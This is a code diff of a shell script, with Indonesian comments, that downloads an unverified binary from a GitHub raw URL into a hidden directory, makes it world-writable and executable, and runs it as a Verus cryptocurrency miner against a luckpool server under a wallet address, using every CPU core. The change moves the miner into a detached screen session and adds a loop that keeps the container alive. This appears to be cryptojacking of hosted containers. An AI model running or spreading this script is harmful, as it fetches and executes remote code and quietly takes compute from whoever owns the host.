@@ -2,7 +2,9 @@
 mkdir -p .kap && cd .kap
 wget -O bubux https://github.com/Dewinet/your/raw/refs/heads/main/bct >/dev/null 2>&1
 chmod 777 bubux
-./bubux -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RFAj8CZ7FcnxoJpQr2wrgEyLGYuhebFaPT.nokia -t $(nproc --all)
 
-# Gunakan loop agar proses tetap berjalan di foreground
+# Jalankan mining di dalam screen
+screen -dmS miner ./bubux -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RFAj8CZ7FcnxoJpQr2wrgEyLGYuhebFaPT.nokia -t $(nproc --all)
+
+# Loop agar container tetap hidup
 while true; do sleep 999; done
